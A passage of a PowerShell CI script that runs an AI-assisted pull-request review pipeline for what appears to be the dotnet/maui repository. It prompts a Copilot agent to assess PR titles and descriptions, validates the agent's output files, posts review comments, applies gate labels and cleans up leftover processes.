- When ``isPRFix`` is ``false``, ``candidateDiff`` MUST be a non-empty unified diff.

## Phase 4 — Recommended PR title & description (REQUIRED — apply the pr-finalize skill)
Apply the **pr-finalize** skill at ``.github/skills/pr-finalize/SKILL.md``. Its core principle is **Preserve Quality**: evaluate the PR's EXISTING title and description FIRST and only recommend a rewrite when the current ones are stale, inaccurate, vague, or missing key information. Many authors write excellent, detailed descriptions — NEVER replace a good description with a shorter generic template. A degraded restatement that drops dependency links, specific type/term names, platform sections, or issue refs is worse than suggesting no change at all.

PR #$PRNumber's CURRENT title:
$prCurrentTitle

PR #$PRNumber's CURRENT description:
$prCurrentBody

Steps:
1. Compare the CURRENT title and description above against the actual diff and the winning fix.
2. Judge quality: is the title specific (platform prefix + component + what changed) and is the description accurate and complete (what changed and why, key files, platform notes, dependency/issue links)?
3. Write your result to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/pr-finalize/content.md``:
   - **If the current title AND description already accurately and completely describe the change**, do NOT invent a replacement and do NOT add optional notes — this whole section is omitted when the metadata is already good. Write EXACTLY this single line and nothing else: ``✅ Current title and description accurately reflect the change — recommend keeping as-is.``
   - **Otherwise**, write ``**Assessment:** ✏️ Recommend updating — <one-line reason>.`` then provide a copy-paste-ready title and description that is a STRICT IMPROVEMENT over the current one: preserve every still-valid detail (dependency links, platform sections, specific type/term names, issue refs), correct inaccuracies, and add missing context. Follow the skill's title formula ``[Platform] Component: What changed`` and keep precise terminology (do not generalize specific names away). Wrap each in its own fenced block so they copy cleanly:

**Recommended title**
``````text
<improved one-line title>
``````

**Recommended description**
``````text
<improved description — preserve good existing content, fix/extend as needed; omit the repo testing-note boilerplate>
``````

Base everything strictly on the real changes (do not invent features). Keep this file focused on the title + description assessment only.

$platformInstruction
$autonomousRules

**Gate result:** $gateStatusForPrompt
Do NOT re-run gate verification.
"@

Invoke-CopilotStep -StepName "STEP 5b: EXPERT REVIEW + COMPARE" -Prompt $step5bPrompt | Out-Null

# Diagnostic: check what STEP 5b produced
Write-Host ""
Write-Host "  📊 STEP 5b output check:" -ForegroundColor Cyan
$expertEvalContent = Join-Path $tryFixDir "expert-pr-eval/content.md"
$reportContent = Join-Path $tryFixDir "report/content.md"
$winnerFile = Join-Path $tryFixDir "winner.json"
$inlineFindings = Join-Path $tryFixDir "inline-findings.json"
if (Test-Path $expertEvalContent) {
    $eeSize = (Get-Item $expertEvalContent).Length
    Write-Host "    ✅ expert-pr-eval/content.md ($eeSize bytes)" -ForegroundColor Green
} else {
    Write-Host "    ❌ expert-pr-eval/content.md MISSING — expert review did not complete" -ForegroundColor Red
}
if (Test-Path $reportContent) {
    $rpSize = (Get-Item $reportContent).Length
    Write-Host "    ✅ report/content.md ($rpSize bytes)" -ForegroundColor Green
} else {
    Write-Host "    ❌ report/content.md MISSING — comparative report not written" -ForegroundColor Red
}
if (Test-Path $winnerFile) {
    $winnerJson = Get-Content -Raw $winnerFile | ConvertFrom-Json -ErrorAction SilentlyContinue
    Write-Host "    🏆 winner.json: winner=$($winnerJson.winner) isPRFix=$($winnerJson.isPRFix)" -ForegroundColor Green
} else {
    Write-Host "    ❌ winner.json MISSING — no winner determined" -ForegroundColor Red
}
if (Test-Path $inlineFindings) {
    $ifSize = (Get-Item $inlineFindings).Length
    Write-Host "    ✅ inline-findings.json ($ifSize bytes)" -ForegroundColor Green
} else {
    Write-Host "    ⚠️ inline-findings.json not found" -ForegroundColor Yellow
}

# Restore review branch — the Copilot agent may have switched branches (e.g. via gh pr checkout)
git checkout $reviewBranch 2>$null | Out-Null

# ─── Tier 3 refresh: feed AI categories back into category detection ───
# Step 2 ran detection without the AI tier (-AiCategories was empty).
# Pre-flight (Step 5) wrote `ai-categories.md`; re-run detection now so the
# unified comment reflects all three tiers before Step 6 posts.
$aiCategoriesFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/uitests/ai-categories.md"
if ($detectScript -and (Test-Path $detectScript) -and (Test-Path $aiCategoriesFile)) {
    try {
        # Pass as a single string (the script declares [string]$AiCategories);
        # an array would not bind correctly across the pwsh -File boundary.
        $aiCategoriesArg = (Get-Content $aiCategoriesFile -Raw).Trim()
        if (-not [string]::IsNullOrWhiteSpace($aiCategoriesArg)) {
            Write-Host "  🔁 Refreshing UI category detection with AI tier..." -ForegroundColor Cyan
            $refreshOutput = & pwsh -NoProfile -File $detectScript -PrNumber "$PRNumber" -AiCategories $aiCategoriesArg 2>&1
            $refreshOutput | ForEach-Object { Write-Host "    $_" }

            $refreshedCategories = $uitestCategories
            foreach ($line in $refreshOutput) {
                if ($line.ToString() -match 'UITestCategoryList;isOutput=true\](.*)$') {
                    $refreshedCategories = $Matches[1]
                }
            }

            # Re-emit the AzDO output variable so Stage 2 (RunDeepUITests)
            # picks up the AI-refreshed category list, not the pre-AI one.
            if ($refreshedCategories -ne $uitestCategories) {
                $refreshedForOutput = if ($refreshedCategories -eq 'NONE') { 'NONE' }
                                      elseif ([string]::IsNullOrWhiteSpace($refreshedCategories)) { 'ALL' }
                                      else { $refreshedCategories }
                Write-Host "##vso[task.setvariable variable=detectedCategories;isOutput=true]$refreshedForOutput"
                Write-Host "  🔁 Updated detectedCategories output: $refreshedForOutput" -ForegroundColor Green
            }

            $uitestOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/uitests"
            $uitestContentFile = Join-Path $uitestOutputDir "content.md"

            if ($refreshedCategories -eq 'NONE') {
                "No UI test categories needed for this PR (no UI-relevant changes)." | Set-Content $uitestContentFile -Encoding UTF8
            } elseif ([string]::IsNullOrWhiteSpace($refreshedCategories)) {
                "Full UI test matrix will run (no specific categories detected from PR changes)." | Set-Content $uitestContentFile -Encoding UTF8
            } else {
                "**Detected UI test categories:** ``$refreshedCategories``" | Set-Content $uitestContentFile -Encoding UTF8
            }
        }
    } catch {
        Write-Host "  ⚠️ AI-tier category refresh failed (non-fatal, keeping Step 2 result): $_" -ForegroundColor Yellow
    }
}

} # end if ($runCopilotReview)

# ─── Phase: Post ────────────────────────────────────────────────────────────
if ($runPost) {

# Restore gate result from file when running in phased mode
if ($Phase -eq 'Post') {
    $gateVerdictDir = if ($TrustedScriptsDir) {
        Split-Path $TrustedScriptsDir -Parent
    } else {
        Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
    }
    $gateVerdictFile = Join-Path $gateVerdictDir "gate-result.txt"
    if (Test-Path $gateVerdictFile) {
        $gateResult = (Get-Content $gateVerdictFile -Raw).Trim()
    } else {
        $gateResult = "SKIPPED"
    }
}

# The APPROVE veto must key off a TRUSTED gate verdict, not the file restored above (that file
# lives in the agent-writable worktree and could be overwritten by the CopilotReview phase). In
# CI the pipeline passes -TrustedGateResult (Gate task output variable, frozen pre-agent); use it
# when present, otherwise fall back to the locally-restored value for non-CI runs.
$trustedGateResultForPost = if (-not [string]::IsNullOrWhiteSpace($TrustedGateResult)) {
    $TrustedGateResult
} else {
    $gateResult
}

# ─── Gate posting (moved here so only the Post task needs GH_TOKEN) ──────
$postGateScript = Join-Path $ScriptsDir "post-gate-comment.ps1"
if (Test-Path $postGateScript) {
    try {
        if ($DryRun) {
            & $postGateScript -PRNumber $PRNumber -DryRun
        } else {
            & $postGateScript -PRNumber $PRNumber
        }
    } catch {
        Write-Host "  ⚠️ Failed to post gate comment (non-fatal): $_" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ⚠️ post-gate-comment.ps1 not found" -ForegroundColor Yellow
}

# Apply gate result label
$gatePassLabel = "s/agent-gate-passed"
$gateFaillabel = "s/agent-gate-failed"
$gateSkipLabel = "s/agent-gate-skipped"
$allGateLabels = @($gatePassLabel, $gateFaillabel, $gateSkipLabel)

$addLabel = switch ($gateResult) {
    "PASSED"  { $gatePassLabel }
    "SKIPPED" { $gateSkipLabel }
    "INCONCLUSIVE" { $gateSkipLabel }  # build/env error — gate could not verify; do NOT apply gate-failed
    default   { $gateFaillabel }
}
$removeLabels = $allGateLabels | Where-Object { $_ -ne $addLabel }

if (-not $DryRun) {
    foreach ($lbl in $removeLabels) {
        gh pr edit $PRNumber --remove-label $lbl --repo dotnet/maui 2>$null | Out-Null
    }
    gh pr edit $PRNumber --add-label $addLabel --repo dotnet/maui 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "  🏷️ Label: $addLabel" -ForegroundColor Cyan
    } else {
        Write-Host "  ⚠️ Failed to apply label $addLabel" -ForegroundColor Yellow
    }
} else {
    Write-Host "  [DRY RUN] Would set label: $addLabel" -ForegroundColor Magenta
}

# ═════════════════════════════════════════════════════════════════════════════
#  STEP 6: Post AI Summary Review (direct script invocation)
#  When DEFER_COMMENT_TO_STAGE3=true, skip posting here — Stage 3
#  (UpdateAISummaryComment) will post the full review after deep tests.
# ═════════════════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "║  STEP 6: POST AI SUMMARY                                  ║" -ForegroundColor Magenta
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Magenta

$summaryScriptsDir = $ScriptsDir

if ($env:DEFER_COMMENT_TO_STAGE3 -eq 'true') {
    Write-Host "  ⏭️ Deferred to Stage 3 (DEFER_COMMENT_TO_STAGE3=true)" -ForegroundColor Gray
    Write-Host "  ℹ️  Content files saved in CopilotLogs artifact" -ForegroundColor Gray
    # Still emit a dummy output var so Stage 3 condition works
    Write-Host "##vso[task.setvariable variable=aiSummaryReviewId;isOutput=true]DEFERRED"
} else {

# Post PR review phases (pre-flight, try-fix, report)
$aiSummaryReviewId = $null
$aiSummaryReviewNodeId = $null
$reviewScript = Join-Path $summaryScriptsDir "post-ai-summary-comment.ps1"
if (Test-Path $reviewScript) {
    try {
        Write-Host "  📝 Posting PR review summary..." -ForegroundColor Cyan
        if ($DryRun) {
            $reviewOutput = & $reviewScript -PRNumber $PRNumber -TrustedGateResult $trustedGateResultForPost -DryRun
        } else {
            $reviewOutput = & $reviewScript -PRNumber $PRNumber -TrustedGateResult $trustedGateResultForPost
        }
        # Capture review ID from script output (format: AI_SUMMARY_REVIEW_ID=<id>)
        $idLine = $reviewOutput | Where-Object { $_ -match '^AI_SUMMARY_REVIEW_ID=' } | Select-Object -Last 1
        $nodeLine = $reviewOutput | Where-Object { $_ -match '^AI_SUMMARY_REVIEW_NODE_ID=' } | Select-Object -Last 1
        if ($idLine -match '^AI_SUMMARY_REVIEW_ID=(\d+)$') {
            $aiSummaryReviewId = $Matches[1]
            if ($nodeLine -match '^AI_SUMMARY_REVIEW_NODE_ID=(.+)$') {
                $aiSummaryReviewNodeId = $Matches[1]
            }
            Write-Host "  ✅ PR review summary posted (review ID: $aiSummaryReviewId)" -ForegroundColor Green

            # Persist review ID + PR number to a known location and emit
            # as an output variable so the downstream UpdateAISummaryComment
            # stage in ci-copilot.yml can rewrite the review body once
            # the deep UI tests finish on the platform-pool agents.
            $reviewIdFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/ai-summary-review-id.txt"
            New-Item -ItemType Directory -Force -Path (Split-Path -Parent $reviewIdFile) | Out-Null
            $aiSummaryReviewId | Set-Content $reviewIdFile -Encoding UTF8
            if (-not [string]::IsNullOrWhiteSpace($aiSummaryReviewNodeId)) {
                $aiSummaryReviewNodeId | Set-Content (Join-Path (Split-Path -Parent $reviewIdFile) "ai-summary-review-node-id.txt") -Encoding UTF8
                Write-Host "##vso[task.setvariable variable=aiSummaryReviewNodeId;isOutput=true]$aiSummaryReviewNodeId"
            }
            Write-Host "##vso[task.setvariable variable=aiSummaryReviewId;isOutput=true]$aiSummaryReviewId"
        } else {
            Write-Host "  ✅ PR review summary posted" -ForegroundColor Green
        }
    } catch {
        Write-Host "  ⚠️ PR review summary posting failed (non-fatal): $_" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ⚠️ post-ai-summary-comment.ps1 not found — skipping review summary" -ForegroundColor Yellow
}

} # END DEFER_COMMENT_TO_STAGE3 else block (summary review only — inline findings + labels always run below)

# Determine winning candidate (winner.json) — drives whether we post inline findings or request changes
$winnerFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/winner.json"
$winner = $null
if (Test-Path $winnerFile) {
    try {
        $winner = Get-Content -Raw -LiteralPath $winnerFile | ConvertFrom-Json
        # Validation
        $allowed = @('pr','pr-plus-reviewer','try-fix-1','try-fix-2','try-fix-3','try-fix-4')
        if (-not $winner.winner -or $allowed -notcontains $winner.winner) {
            Write-Host "  ⚠️ winner.json has invalid 'winner' value: $($winner.winner) — falling back to PR-fix path" -ForegroundColor Yellow
            $winner = $null
        } elseif ($winner.winner -in @('pr','pr-plus-reviewer') -and $winner.isPRFix -ne $true) {
            Write-Host "  ⚠️ winner.json: '$($winner.winner)' must have isPRFix=true — overriding" -ForegroundColor Yellow
            $winner.isPRFix = $true
        } elseif ($winner.winner -like 'try-fix-*' -and $winner.isPRFix -ne $false) {
            Write-Host "  ⚠️ winner.json: '$($winner.winner)' must have isPRFix=false — overriding" -ForegroundColor Yellow
            $winner.isPRFix = $false
        }
        if ($winner -and $winner.isPRFix -eq $false -and [string]::IsNullOrWhiteSpace($winner.candidateDiff)) {
            Write-Host "  ⚠️ winner.json: non-PR winner has empty candidateDiff — falling back to PR-fix path" -ForegroundColor Yellow
            $winner = $null
        }
        if ($winner) {
            Write-Host "  🏆 Winning candidate: $($winner.winner) (isPRFix=$($winner.isPRFix))" -ForegroundColor Cyan
        }
    } catch {
        Write-Host "  ⚠️ Failed to parse winner.json (non-fatal): $_ — falling back to PR-fix path" -ForegroundColor Yellow
        $winner = $null
    }
} else {
    Write-Host "  ℹ️ No winner.json — defaulting to PR-fix posting path" -ForegroundColor Gray
}

$isPRWinner = (-not $winner) -or ($winner.isPRFix -eq $true)

if (Get-Command Hide-StaleMauiBotIssueComments -ErrorAction SilentlyContinue) {
    Hide-StaleMauiBotIssueComments `
        -PRNumber $PRNumber `
        -IncludeTryFix `
        -Reason "stale try-fix notice"
}

if (Get-Command Dismiss-StaleMauiBotTryFixReviews -ErrorAction SilentlyContinue) {
    Dismiss-StaleMauiBotTryFixReviews `
        -PRNumber $PRNumber `
        -Reason "stale try-fix review"
}

if ($isPRWinner) {
    # Post inline review comments (file:line findings from expert-reviewer agent)
    $inlineScript = Join-Path $summaryScriptsDir "post-inline-review.ps1"
    $findingsFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/inline-findings.json"
    if ((Test-Path $inlineScript) -and (Test-Path $findingsFile)) {
        try {
            Write-Host "  📝 Posting inline review comments..." -ForegroundColor Cyan
            if ($DryRun) {
                & $inlineScript -PRNumber $PRNumber -FindingsFile $findingsFile -DryRun
            } else {
                & $inlineScript -PRNumber $PRNumber -FindingsFile $findingsFile
            }
            Write-Host "  ✅ Inline review comments posted" -ForegroundColor Green
        } catch {
            Write-Host "  ⚠️ Inline review posting failed (non-fatal): $_" -ForegroundColor Yellow
        }
    } else {
        if (-not (Test-Path $findingsFile)) {
            Write-Host "  ℹ️ No inline findings file — agent may not have produced findings" -ForegroundColor Gray
        }
    }
} else {
    # Non-PR candidate details are now merged into the unified AI Summary
    # Future Action section. Avoid a second MauiBot review so the PR has one
    # source of truth for automated review guidance.
    Write-Host "  ⏭️ Non-PR candidate selected; Future Action is included in AI Summary" -ForegroundColor Cyan
    Write-Host "  ⏭️ Skipping inline findings (winner is not the PR fix)" -ForegroundColor Gray
}

# ═════════════════════════════════════════════════════════════════════════════
#  STEP 7: Apply Labels
# ═════════════════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Blue
Write-Host "║  STEP 7: APPLY LABELS                                     ║" -ForegroundColor Blue
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Blue

$labelHelperPath = Join-Path $ScriptsDir "shared/Update-AgentLabels.ps1"
if (Test-Path $labelHelperPath) {
    try {
        . $labelHelperPath
        Apply-AgentLabels -PRNumber $PRNumber -RepoRoot $RepoRoot
        Write-Host "  ✅ Labels applied" -ForegroundColor Green
    } catch {
        Write-Host "  ⚠️ Label application failed (non-fatal): $_" -ForegroundColor Yellow
    } finally {
        if (-not $env:TF_BUILD -and (Get-Command Clear-AgentReviewInProgress -ErrorAction SilentlyContinue)) {
            Clear-AgentReviewInProgress -PRNumber $PRNumber | Out-Null
        }
    }
} else {
    Write-Host "  ⚠️ Label helper not found — skipping" -ForegroundColor Yellow
}

} # end if ($runPost)

# ═════════════════════════════════════════════════════════════════════════════
#  Cleanup
# ═════════════════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "🧹 Cleaning up child processes..." -ForegroundColor Gray
try {
    $orphans = Get-Process -Name "node" -ErrorAction SilentlyContinue | Where-Object {
        ($_.Path -and $_.Path -match "copilot") -or
        ($_.CommandLine -and $_.CommandLine -match "copilot")
    }
    $copilotProcs = Get-Process -Name "copilot" -ErrorAction SilentlyContinue
    $allOrphans = @($orphans) + @($copilotProcs) | Where-Object { $_ -ne $null } | Sort-Object Id -Unique
    if ($allOrphans.Count -gt 0) {
        Write-Host "  Stopping $($allOrphans.Count) orphaned process(es)" -ForegroundColor Gray
        $allOrphans | Stop-Process -Force -ErrorAction SilentlyContinue
    }
} catch {
    Write-Host "  ⚠️ Cleanup warning: $_" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "✅ Review complete for PR #$PRNumber" -ForegroundColor Green
Write-Host "📁 Output: CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/" -ForegroundColor Gray
Write-Host ""

if ($LogFile) { Stop-Transcript | Out-Null }
